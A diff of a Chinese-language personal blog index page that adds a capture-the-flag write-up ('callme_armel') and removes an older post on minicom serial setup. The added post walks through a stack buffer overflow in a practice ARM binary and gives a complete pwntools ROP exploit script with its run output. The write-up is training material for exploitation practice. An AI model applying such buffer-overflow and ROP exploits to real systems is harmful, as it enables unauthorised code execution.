@@ -168,6 +168,88 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/11/callme_armel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="stay hungry, stay foolish">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/11/callme_armel/" class="post-title-link" itemprop="url">callme_armel</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-11 09:54:22 / Modified: 10:25:58" itemprop="dateCreated datePublished" datetime="2023-04-11T09:54:22+08:00">2023-04-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这个题目是为了考察armel下使用rop调用函数传参，需要依次传入指定参数调用callme_one、 callme_two、callme_three，如下：</p>
+<ul>
+<li><code>callme_one(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D)</code></li>
+<li><code>callme_two(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D)</code></li>
+<li><code>callme_three(0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D)</code></li>
+</ul>
+<p>存在缓冲区溢出漏洞的pwnme函数还是老样子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [sp+0h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>缓冲区起始地址在FP-0x24，函数返回地址保存在FP，因此填充0x24个字节后开始覆盖返回地址。<br>寻找gadgets：需要找到能够操控R0~R2的gadget，还需要从栈上POP数据，非常好运找到如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary callme_armv5 | grep &quot;pop&quot;</span><br><span class="line">0x00010870 : pop &#123;r0, r1, r2, lr, pc&#125;</span><br></pre></td></tr></table></figure>
+<p>ROP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(<span class="number">0x00010870</span>)  <span class="comment"># pop &#123;r0, r1, r2, lr, pc&#125;</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(<span class="number">0x00010870</span>)</span><br><span class="line">rop += p32(addr_of_callmeone)</span><br><span class="line"></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(<span class="number">0x00010870</span>)</span><br><span class="line">rop += p32(addr_of_callmetwo)</span><br><span class="line"></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(<span class="number">0x00010870</span>)</span><br><span class="line">rop += p32(addr_of_callmethree)</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./callme_armv5&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;arm&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">pop_r012_lr_pc = <span class="number">0x00010870</span></span><br><span class="line">callme_one = <span class="number">0x00010618</span></span><br><span class="line">callme_two = <span class="number">0x0001066C</span></span><br><span class="line">callme_three = <span class="number">0x0001060C</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">0x24</span></span><br><span class="line">rop += p32(pop_r012_lr_pc)  <span class="comment"># pop &#123;r0, r1, r2, lr, pc&#125;</span></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(pop_r012_lr_pc)</span><br><span class="line">rop += p32(callme_one)</span><br><span class="line"></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(pop_r012_lr_pc)</span><br><span class="line">rop += p32(callme_two)</span><br><span class="line"></span><br><span class="line">rop += p32(<span class="number">0xDEADBEEF</span>)  <span class="comment"># r0</span></span><br><span class="line">rop += p32(<span class="number">0xCAFEBABE</span>)  <span class="comment"># r1</span></span><br><span class="line">rop += p32(<span class="number">0xD00DF00D</span>)  <span class="comment"># r2</span></span><br><span class="line">rop += p32(pop_r012_lr_pc)</span><br><span class="line">rop += p32(callme_three)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 callme.py </span><br><span class="line">[*] &#x27;/home/utest/rop_practice/armv5/callme_armv5/callme_armv5&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 0.0.0.0 on port 8888: Done</span><br><span class="line">[*] Paused (press any to continue)</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 0.0.0.0 port 8888</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/10/split_armel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1149,96 +1231,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/29/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0-%E4%BD%BF%E7%94%A8minicom%E5%92%8CK2P%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="stay hungry, stay foolish">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/29/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0-%E4%BD%BF%E7%94%A8minicom%E5%92%8CK2P%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1/" class="post-title-link" itemprop="url">树莓派折腾日记-使用minicom和K2P进行通信</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-03-29 03:12:08 / Modified: 17:21:44" itemprop="dateCreated datePublished" datetime="2023-03-29T03:12:08+08:00">2023-03-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这篇文章本质是上说明一下minicom的使用，和树莓派设备倒是没有太大的关系，Linux平台、WSL、Mac都是通用的。</p>
-<h2 id="minicom"><a href="#minicom" class="headerlink" title="minicom"></a>minicom</h2><p>minicom是Linux下的一个常用的命令行串口调试工具，可以串口和硬件设备进行通信，通常用于嵌入式设备中。安装minicom非常简单：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install minicom</span><br></pre></td></tr></table></figure>
-<p>选项说明：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-b, --baudrate         : 设置波特率，忽略配置文件</span><br><span class="line">-D, --device           : 指定串口设备，Linux下的设备/dev/ttyUSB这样，忽略配置文件</span><br><span class="line">-s, --setup            : 进入设置模式</span><br><span class="line">-o, --noinit           : 启动时不初始化modem和lockfiles</span><br><span class="line">-m, --metakey          : use meta or alt key for commands</span><br><span class="line">-M, --metakey8         : use 8bit meta key for commands</span><br><span class="line">-l, --ansi             : literal; assume screen uses non IBM-PC character set</span><br><span class="line">-L, --iso              : don&#x27;t assume screen uses ISO8859</span><br><span class="line">-w, --wrap             : Linewrap on</span><br><span class="line">-H, --displayhex       : display output in hex</span><br><span class="line">-z, --statline         : 尝试使用终端的状态栏</span><br><span class="line">-7, --7bit             : 强制使用7位模式</span><br><span class="line">-8, --8bit             : 强制使用8位模式</span><br><span class="line">-c, --color=on/off     : 开启或者关闭ANSI风格颜色用法</span><br><span class="line">-a, --attrib=on/off    : 开启或者关闭高亮属性</span><br><span class="line">-t, --term=TERM        : 覆盖TERM环境变量</span><br><span class="line">-S, --script=SCRIPT    : 启动时运行脚本</span><br><span class="line">-d, --dial=ENTRY       : dial ENTRY from the dialing directory</span><br><span class="line">-p, --ptty=TTYP        : 连接到伪终端</span><br><span class="line">-C, --capturefile=FILE : 捕获终端输出并保存到文件中</span><br><span class="line">--capturefile-buffer-mode=MODE : set buffering mode of capture file</span><br><span class="line">-F, --statlinefmt      : format of status line</span><br><span class="line">-R, --remotecharset    : character set of communication partner</span><br><span class="line">-v, --version          : 版本信息</span><br><span class="line">-h, --help             : 帮助文档</span><br><span class="line">configuration          : 指定minicom配置文件启动</span><br></pre></td></tr></table></figure>
-<p>启动minicom有两种方式，一种是先对当前文件设置一个配置文件，配置文件包括波特率、校验位等等信息，后续通过该配置文件启动；另一种是直接在终端命令配置启动。</p>
-<p>我买的ch341a编程器支持TTL和编程器两种模式，只需要将跳帽连接到对应模式引脚即可。连接线我买的是钻石头（形状）探针，前端是4个弹簧收缩的探针，这样在测试引脚的时候就不用先焊接到板子的UART端口上。<br><img src="/images/image-2023-0329-162438893.png" alt="undifined"></p>
-<p>实验使用的K2P板子上的UART口也非常明显，还贴心标明了端口，那么连接的时候使用跳线将板子上的TX和编程器的RXD连接、板子上的RX和编程器的TXD连接，设置好minicom就可以进行通信了<br><img src="/images/image-2023-0329-162845546.png" alt="undifined"><br>工作时的探针+K2P+树莓派如下：<br><img src="/images/image-2023-0329-171322420.png" alt="undifined"></p>
-<p>当编程器连接到树莓派时，出现设备&#x2F;dev&#x2F;ttyUSB0，后续在minicom中设置<br><img src="/images/image-2023-0329-165128592.png" alt="undifined"></p>
-<h2 id="1-从配置文件启动"><a href="#1-从配置文件启动" class="headerlink" title="1. 从配置文件启动"></a>1. 从配置文件启动</h2><p>minicom的配置文件保存在&#x2F;etc&#x2F;minicom&#x2F;目录下，因此如果要保存当前的设置到配置文件或者默认配置，必须以root权限运行minicom。<br>进入minicom，然后在Serial port setup中进行配置：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo minicom -s</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-2023-0329-170309270.png" alt="undifined"><br>设置波特率&#x3D;57600，8N1。要修改某个选项就按下对应的按键即可，例如修改串口设备，按下A，则可以修改。<br><img src="/images/image-2023-0329-170147829.png" alt="undifined"><br>保存完毕后，ESC退出，Save setup as ..。例如我保存为K2P的配置文件。<br><img src="/images/image-2023-0329-170506679.png" alt="undifined"><br>再退出，就可以按照当前的配置进行通信了。熟悉折腾的可以看出，这个K2P已经被我刷了Breed（不死鸟，一个bootloader）了。<br><img src="/images/image-2023-0329-170828970.png" alt="undifined"></p>
-<p>下次启动，则可以直接指定当前设备的配置文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo minicom K2P</span><br></pre></td></tr></table></figure>
-<h2 id="2-命令行配置启动"><a href="#2-命令行配置启动" class="headerlink" title="2. 命令行配置启动"></a>2. 命令行配置启动</h2><p>没有什么好说的，就是在命令行参数进行了相关的配置，例如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo minicom -b 57600 -D /dev/ttyUSB0 -8</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-2023-0329-171654138.png" alt="undifined"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>先简单说了一下minicom的相关配置，然后以K2P为例，使用探针和编程器连接到K2P的UART，配置好minicom的参数后，上电即可看到UART的相关输出。</p>
-<p>个人更加偏好将minicom的配置保存为一个设备配置文件，而后从中启动，这样比较方便。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1304,7 +1300,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
